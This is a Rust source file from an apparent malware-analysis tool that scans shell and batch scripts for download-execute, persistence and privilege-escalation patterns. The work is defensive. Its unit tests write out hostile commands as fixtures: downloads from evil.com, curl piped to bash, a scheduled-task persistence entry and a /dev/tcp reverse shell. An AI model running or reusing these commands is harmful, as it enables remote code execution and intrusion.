// Batch / Shell script static analysis
// Detection patterns loaded from private scoring crate.

use crate::output::ShellScriptAnalysis;
use anya_scoring::detection_patterns::SHELL_SUSPICIOUS_PATTERNS;
use regex::Regex;
use std::sync::LazyLock;

/// Labels for shell patterns (must match SHELL_SUSPICIOUS_PATTERNS order)
const SHELL_LABELS: &[&str] = &[
    "certutil decode",
    "bitsadmin transfer",
    "PowerShell execution policy bypass",
    "Registry Run key addition",
    "Scheduled task creation",
    "User/group modification",
    "MSHTA execution",
    "curl | sh (pipe to shell)",
    "wget | sh (pipe to shell)",
    "Reverse shell pattern",
    "Crontab modification",
];

/// Download-execute pattern indices
const DOWNLOAD_EXEC_IDX: &[usize] = &[0, 1, 7, 8, 9];
/// Persistence pattern indices
const PERSISTENCE_IDX: &[usize] = &[3, 4, 10];
/// Privilege escalation indices
const PRIV_ESC_IDX: &[usize] = &[5];

static SHELL_COMPILED: LazyLock<Vec<Option<Regex>>> = LazyLock::new(|| {
    SHELL_SUSPICIOUS_PATTERNS
        .iter()
        .map(|pat| Regex::new(pat).ok())
        .collect()
});

/// Detect script type from content heuristics
fn detect_script_type(text: &str) -> &'static str {
    if text.starts_with("#!/") {
        if text.starts_with("#!/bin/bash")
            || text.starts_with("#!/bin/sh")
            || text.starts_with("#!/usr/bin/env bash")
            || text.starts_with("#!/usr/bin/env sh")
        {
            return "shell";
        }
    }
    if text.contains("@echo off") || text.contains("@ECHO OFF") || text.contains("%~") {
        return "batch";
    }
    // Fallback: look for strong indicators
    if text.contains("#!/") || text.contains("$(") || text.contains("fi\n") {
        return "shell";
    }
    if text.contains("%%") || text.contains("ERRORLEVEL") {
        return "batch";
    }
    "unknown"
}

/// Analyse file bytes as a batch or shell script.
pub fn detect_shell_script_analysis(data: &[u8]) -> Option<ShellScriptAnalysis> {
    let text = match std::str::from_utf8(data) {
        Ok(s) => s,
        Err(_) => return None,
    };

    let script_type = detect_script_type(text).to_string();
    let mut commands: Vec<String> = Vec::new();
    let mut has_download_execute = false;
    let mut has_persistence = false;
    let mut has_privilege_escalation = false;

    for (i, maybe_re) in SHELL_COMPILED.iter().enumerate() {
        if let Some(re) = maybe_re {
            if re.is_match(text) {
                let label = SHELL_LABELS.get(i).copied().unwrap_or("suspicious pattern");
                commands.push(label.to_string());
                if DOWNLOAD_EXEC_IDX.contains(&i) {
                    has_download_execute = true;
                }
                if PERSISTENCE_IDX.contains(&i) {
                    has_persistence = true;
                }
                if PRIV_ESC_IDX.contains(&i) {
                    has_privilege_escalation = true;
                }
            }
        }
    }

    if commands.is_empty() {
        return None;
    }

    Some(ShellScriptAnalysis {
        script_type,
        has_download_execute,
        has_persistence,
        has_privilege_escalation,
        suspicious_commands: commands,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_clean_batch() {
        let code = b"@echo off\necho Hello World\npause";
        assert!(detect_shell_script_analysis(code).is_none());
    }

    #[test]
    fn test_certutil_download() {
        let code = b"certutil -urlcache -split -f http://evil.com/payload.exe %TEMP%\\p.exe\ncertutil -decode %TEMP%\\p.exe %TEMP%\\decoded.exe";
        let r = detect_shell_script_analysis(code).unwrap();
        assert!(r.has_download_execute);
    }

    #[test]
    fn test_curl_pipe_bash() {
        let code = b"#!/bin/bash\ncurl http://evil.com/install.sh | bash";
        let r = detect_shell_script_analysis(code).unwrap();
        assert!(r.has_download_execute);
        assert_eq!(r.script_type, "shell");
    }

    #[test]
    fn test_persistence() {
        let code = b"@echo off\nschtasks /create /tn \"Update\" /tr \"malware.exe\" /sc onlogon";
        let r = detect_shell_script_analysis(code).unwrap();
        assert!(r.has_persistence);
    }

    #[test]
    fn test_reverse_shell() {
        let code = b"#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        let r = detect_shell_script_analysis(code).unwrap();
        assert!(r.has_download_execute);
    }
}
